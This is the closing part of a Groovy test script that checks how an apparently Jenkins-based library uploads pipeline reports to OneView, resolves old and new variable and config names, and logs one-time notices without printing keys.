    check('report upload with the keys of the Jenkinsfile: a run with several pipelineKeys sends one POST per key in their order, each with its own key and the same report, so that every pipeline of OneView gets the report of the run',
            !several.error && several.posts*.key == several.keys && several.posts*.address == [OneViewFixtures.ONEVIEW_URL] * 2 && several.posts*.html == [reportHtml] * 2
                    && several.lines == several.keys.collect { uploadingLine(oneViewTarget, OneViewFixtures.hint(it as String)) } && !several.notices && !several.keyPrinted
                    && (several.j as FakeScript).calls.count { it.startsWith('withEnv [ONEVIEW_URL=') } == 2
                    && (several.j as FakeScript).calls.count { it.startsWith("sh rm -f 'oneview_report_") } == 2,
            "${several.error} | ${several.posts*.key} | ${several.lines} | ${several.notices} | printed ${several.keyPrinted}")
    Map formerOnly = keyedUpload([ONEVIEW_URL: null, DSO_PORTAL_URL: formerAddress], [gui, backend])
    check('report upload with the keys of the Jenkinsfile: on a Jenkins that sets only DSO_PORTAL_URL the report of every key goes to that address',
            !formerOnly.error && formerOnly.posts*.key == formerOnly.keys && formerOnly.posts*.address == [formerAddress] * 2 && formerOnly.notices == [renameLine('DSO_PORTAL_URL', 'ONEVIEW_URL')],
            "${formerOnly.error} | ${formerOnly.posts} | ${formerOnly.notices}")
    Map foreignKey = keyedUpload([DSO_PIPELINE_KEY: 'pipe-key-99'], [gui, backend])
    check('report upload: a DSO_PIPELINE_KEY of the job that is no key of the Jenkinsfile comes first and gives one upload, as before, without a line and without a hint',
            !foreignKey.error && foreignKey.posts*.key == ['pipe-key-99'] && foreignKey.lines == [uploadingLine(oneViewTarget)] && !foreignKey.notices
                    && !(foreignKey.j as FakeScript).log.any { it.contains('pipe-key') },
            "${foreignKey.error} | ${foreignKey.posts*.key} | ${foreignKey.lines} | ${foreignKey.notices}")
    Map legacyKey = keyedUpload([PIPELINE_KEY: ' pipe-key-77 '], [gui])
    check('report upload: a PIPELINE_KEY of the job that is no key of the Jenkinsfile gives one upload with it, as before',
            !legacyKey.error && legacyKey.posts*.key == ['pipe-key-77'] && legacyKey.lines == [uploadingLine(oneViewTarget)] && !legacyKey.notices,
            "${legacyKey.error} | ${legacyKey.posts*.key} | ${legacyKey.lines} | ${legacyKey.notices}")
    Map blankVariables = keyedUpload([DSO_PIPELINE_KEY: ' ', PIPELINE_KEY: ''], [gui, backend])
    check('report upload: a blank DSO_PIPELINE_KEY and an empty PIPELINE_KEY count as not set, and the keys of the Jenkinsfile are used',
            !blankVariables.error && blankVariables.posts*.key == blankVariables.keys && !blankVariables.notices, "${blankVariables.error} | ${blankVariables.posts*.key} | ${blankVariables.notices}")
    Map blocksBehind = keyedUpload([:], [changed(gui, [:]).with { Map d -> ((d.projects as Map).gui as Map).putAll([oneview: [pipelineKey: 'key-of-oneview-block'], portal: [pipelineKey: 'key-of-portal-block']]); d }])
    check('report upload: the key of the Jenkinsfile comes before oneview.pipelineKey and portal.pipelineKey, which are not read and not named',
            !blocksBehind.error && blocksBehind.posts*.key == blocksBehind.keys && !blocksBehind.notices && !(blocksBehind.j as FakeScript).log.any { it.contains('pipelineKey') },
            "${blocksBehind.error} | ${blocksBehind.posts*.key} | ${blocksBehind.notices}")

    [[name: 'DSO_PIPELINE_KEY', value: { List own -> own[0] }, documents: [gui]],
     [name: 'PIPELINE_KEY', value: { List own -> own[0] }, documents: [gui]],
     [name: 'DSO_PIPELINE_KEY', value: { List own -> ' ' + (own[0] as String).toUpperCase() + ' ' }, documents: [gui]],
     [name: 'DSO_PIPELINE_KEY', value: { List own -> own[1] }, documents: [gui, backend]],
     [name: 'PIPELINE_KEY', value: { List own -> own[0] }, documents: [gui, backend]]
    ].each { Map spec ->
        int count = (spec.documents as List).size()
        String value = (spec.value as Closure).call((1..count).collect { OneViewFixtures.key(it) }) as String
        Map same = keyedUpload([(spec.name as String): value], spec.documents as List<Map>, [times: 2])
        String key = value.trim().toLowerCase()
        check("report upload, an explicit value that equals what the library would use: ${spec.name} holds ${count == 1 ? 'the key' : 'one of the ' + count + ' keys'} of the Jenkinsfile${value == key ? '' : ', in upper case and between spaces'} - " +
                "one upload with that key as the run read it, and one line, logged once for two uploads, says that it can be removed from the job; the key itself is not printed",
                !same.error && same.posts*.key == [key] * 2 && same.notices == [sameKeyLine(spec.name as String, key, count)]
                        && same.lines == [uploadingLine(oneViewTarget)] * 2 && !same.keyPrinted && (same.notices[0] as String).contains('it can be removed from the job'),
                "${same.error} | ${same.posts*.key} | ${same.notices} | ${same.lines} | printed ${same.keyPrinted}")
    }

    Map firstFails = keyedUpload([:], [gui, backend], [failFor: { key, url -> key == OneViewFixtures.key(1) }])
    check('report upload with the keys of the Jenkinsfile: a failed upload of one key is one [ONEVIEW] line with the hint of that key, its files are removed, the next key is still uploaded, and the result of the build stays as it was',
            !firstFails.error && firstFails.posts*.key == firstFails.keys && (firstFails.j as FakeScript).currentBuild.result == null && !firstFails.keyPrinted
                    && firstFails.lines == [uploadingLine(oneViewTarget, OneViewFixtures.hint(firstFails.keys[0] as String)),
                                            "[ONEVIEW] Failed to upload pipeline report to OneView for pipeline key ${OneViewFixtures.hint(firstFails.keys[0] as String)}: script returned exit code 22 after ${oneViewTarget} answered".toString(),
                                            uploadingLine(oneViewTarget, OneViewFixtures.hint(firstFails.keys[1] as String))]
                    && (firstFails.j as FakeScript).calls.count { it.startsWith("sh rm -f 'oneview_report_") } == 2,
            "${firstFails.error} | ${firstFails.posts*.key} | ${firstFails.lines}")
    Map stopped = keyedUpload([:], [gui, backend], [failFor: { key, url -> new FakeFlowInterruptedException('the build was aborted') }])
    check('report upload with the keys of the Jenkinsfile: an abort of the build during an upload ends the uploads - one line, the files of that upload are removed and the remaining keys are not tried',
            !stopped.error && stopped.posts*.key == [stopped.keys[0]] && !stopped.keyPrinted
                    && stopped.lines == [uploadingLine(oneViewTarget, OneViewFixtures.hint(stopped.keys[0] as String)),
                                         "[ONEVIEW] Failed to upload pipeline report to OneView for pipeline key ${OneViewFixtures.hint(stopped.keys[0] as String)}: the build was aborted".toString()]
                    && (stopped.j as FakeScript).calls.count { it.startsWith("sh rm -f 'oneview_report_") } == 1,
            "${stopped.error} | ${stopped.posts*.key} | ${stopped.lines}")
    Map allFail = keyedUpload([:], [gui, backend], [failFor: { key, url -> true }])
    check('report upload with the keys of the Jenkinsfile: when every upload fails each key is tried once, each failure is one line, and the build goes on with its result',
            !allFail.error && allFail.posts*.key == allFail.keys && allFail.lines.count { (it as String).startsWith('[ONEVIEW] Failed') } == 2 && (allFail.j as FakeScript).currentBuild.result == null,
            "${allFail.error} | ${allFail.posts*.key} | ${allFail.lines}")

    FakeScript twice = jenkins([:])
    String keyOfGui = OneViewFixtures.publish(twice, gui)
    twice.files['devsecops_config.yaml'] = configText
    Map loaded = load(twice, 'full', [pipelineKey: keyOfGui])
    List afterKey = loaded.state.oneViewKeys as List
    loaded.harness.run { loaded.loader.load('full', agents) }
    check('the keys of the run: load() keeps them in the state for the upload, and a second configure() without a key drops them',
            !loaded.error && afterKey == [keyOfGui] && loaded.state.oneViewKeys == [], "${loaded.error} | ${afterKey} | ${loaded.state.oneViewKeys}")

    Map sentBlock = changed(gui, [:])
    ((sentBlock.projects as Map).gui as Map).portal = [url: 'https://five.bbh.com']
    Map fromDocument = keyedUpload([:], [sentBlock], [beforeUpload: { FakeScript s -> s.env.vars.remove('ONEVIEW_URL') }])
    check('a portal: block in the configuration that OneView sent is still read, and its line names that configuration as its place, never the Global Settings',
            !fromDocument.error && fromDocument.posts*.address == ['https://five.bbh.com']
                    && fromDocument.notices == [renameBlockLine('portal.url', 'oneview.url', 'in the configuration that OneView sent for this run')],
            "${fromDocument.error} | ${fromDocument.posts*.address} | ${fromDocument.notices}")
}
keysOfTheJenkinsfile()

Closure oncePerBuild = { ->
    String agentLabel = 'linux-agent'
    [[kind: 'a former name that holds another value (rule 1), for the address, the upload address and the agent',
      env: [ONEVIEW_URL: OneViewFixtures.ONEVIEW_URL, DSO_PORTAL_URL: formerAddress, PORTAL_URL: 'https://three.bbh.com', ONEVIEW_AGENT: agentLabel, DSO_PORTAL_AGENT: 'portal-reader'],
      notices: [shadowedLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), shadowedLine('PORTAL_URL', 'ONEVIEW_URL'), shadowedLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')]],
     [kind: 'a former name alone (rule 2), for the address and the agent',
      env: [ONEVIEW_URL: null, DSO_PORTAL_URL: formerAddress, DSO_PORTAL_AGENT: agentLabel],
      notices: [renameLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), renameLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')]],
     [kind: 'a new name that is ignored because it is blank (rule 3), for the address and the agent',
      env: [ONEVIEW_URL: ' ', DSO_PORTAL_URL: formerAddress, ONEVIEW_AGENT: '', DSO_PORTAL_AGENT: agentLabel],
      notices: [ignoredLine('ONEVIEW_URL', 'it is blank', 'DSO_PORTAL_URL, its former name,'), ignoredLine('ONEVIEW_AGENT', 'it is blank', 'DSO_PORTAL_AGENT, its former name,')]],
     [kind: 'a new name that is ignored because it is not an address (rule 3)',
      env: [ONEVIEW_URL: withSecret, DSO_PORTAL_URL: formerAddress],
      notices: [ignoredLine('ONEVIEW_URL', notAnAddressReason, 'DSO_PORTAL_URL, its former name,')]],
     [kind: 'a former name with the same value (rule 4), for the address, the upload address and the agent',
      env: [ONEVIEW_URL: formerAddress, DSO_PORTAL_URL: formerAddress, PORTAL_URL: formerAddress + '/', ONEVIEW_AGENT: agentLabel, DSO_PORTAL_AGENT: agentLabel],
      notices: [removableLine('DSO_PORTAL_URL', 'ONEVIEW_URL'), removableLine('PORTAL_URL', 'ONEVIEW_URL'), removableLine('DSO_PORTAL_AGENT', 'ONEVIEW_AGENT')]],
     [kind: 'a variable of the job that holds a key of the Jenkinsfile',
      env: [DSO_PIPELINE_KEY: OneViewFixtures.key(2)],
      notices: [sameKeyLine('DSO_PIPELINE_KEY', OneViewFixtures.key(2), 2)]]
    ].each { Map spec ->
        Map result = keyedUpload(spec.env as Map, [gui, backend], [reads: 2, times: 2])
        check("a notice is logged once per build: ${spec.kind} - two configuration reads and two report uploads of one build log each line once",
                !result.error && (result.notices as List).sort(false) == (spec.notices as List).sort(false) && result.lines.size() >= 2
                        && (result.j as FakeScript).calls.count { it.startsWith('sh [Read the configuration from OneView] ') } == 2 && !leaks(result.j as FakeScript, result.error),
                "${result.error} | ${result.notices} | ${result.lines}")
    }
    [[kind: 'the block portal: with url and pipelineKey (rule 2)',
      env: [DSO_PIPELINE_KEY: null], blocks: [portal: [url: 'https://five.bbh.com', pipelineKey: 'key-of-portal-block']], uploads: 2,
      notices: [renameBlockLine('portal.pipelineKey', 'oneview.pipelineKey', inFile), renameBlockLine('portal.url', 'oneview.url', inFile)]],
     [kind: 'a blank oneview.url and a blank oneview.pipelineKey (rule 3)',
      env: [DSO_PIPELINE_KEY: null], blocks: [oneview: [url: '', pipelineKey: ''], portal: [url: 'https://five.bbh.com', pipelineKey: 'key-of-portal-block']], uploads: 2,
      notices: [ignoredLine('oneview.pipelineKey', 'it is blank', 'portal.pipelineKey, its former name,', inFile), ignoredLine('oneview.url', 'it is blank', 'portal.url, its former name,', inFile)]],
     [kind: 'an oneview.url that is not an address (rule 3) and a portal.pipelineKey with another value (rule 1)',
      env: [DSO_PIPELINE_KEY: null], blocks: [oneview: [url: withSecret, pipelineKey: 'key-of-oneview-block'], portal: [url: 'https://five.bbh.com', pipelineKey: 'key-of-portal-block']], uploads: 2,
      notices: [shadowedLine('portal.pipelineKey', 'oneview.pipelineKey'), ignoredLine('oneview.url', notAnAddressReason, 'portal.url, its former name,', inFile)]],
     [kind: 'both blocks with the same values (rule 4)',
      env: [DSO_PIPELINE_KEY: null], blocks: [oneview: [url: 'https://five.bbh.com', pipelineKey: 'key-of-both-blocks'], portal: [url: 'https://five.bbh.com', pipelineKey: 'key-of-both-blocks']], uploads: 2,
      notices: [removableLine('portal.pipelineKey', 'oneview.pipelineKey', inFile), removableLine('portal.url', 'oneview.url', inFile)]],
     [kind: 'PORTAL_URL alone (rule 2)',
      env: [PORTAL_URL: 'https://three.bbh.com'], blocks: [:], uploads: 2, notices: [renameLine('PORTAL_URL', 'ONEVIEW_URL')]],
     [kind: 'a former name whose value is not of the strict form',
      env: [DSO_PORTAL_URL: 'http://dso_portal:8080'], blocks: [:], uploads: 2, notices: [formerValueLine('DSO_PORTAL_URL', 'ONEVIEW_URL', variablePlace)]],
     [kind: 'the report that is not uploaded',
      env: [ONEVIEW_URL: withSecret], blocks: [:], uploads: 0, notices: [notUploadedLine(['ONEVIEW_URL'])]]
    ].each { Map spec ->
        Map result = upload(spec.env as Map, spec.blocks as Map, [times: 2])
        check("a notice is logged once per build: ${spec.kind} - two report uploads of one build log each line once",
                !result.error && result.notices == spec.notices && result.posts.size() == spec.uploads && !result.leak,
                "${result.error} | ${result.notices} | ${result.posts.size()}")
    }
}
oncePerBuild()

List<String> settingNotices = (everyNotice + keyedNotices).findAll { it.contains('oneview.') || it.contains('portal.') }
check('the lines about the block oneview: or portal: name a place where the block can be edited - the file the run read, the defaults file of the library or the configuration that OneView sent - and never the Global Settings, where OneView has no field for it',
        settingNotices.size() > 20 && !(everyNotice + keyedNotices).any { it.contains('Global Settings') || it.contains('settings of the service') }
                && settingNotices.findAll { it.contains(' correct it ') || it.contains(' rename the block ') || it.contains(' can be removed ') || it.contains(' it must be written as ') }.every {
            it.endsWith(inFile) || it.endsWith('in config.yaml') || it.endsWith(inLibrary) || it.endsWith('in the configuration that OneView sent for this run') || it.endsWith(variablePlace)
        },
        settingNotices.unique())

println "\n${failures == 0 ? 'ALL ONEVIEW SCENARIOS PASSED' : failures + ' ONEVIEW SCENARIO CHECK(S) FAILED'}"
System.exit(failures == 0 ? 0 : 1)
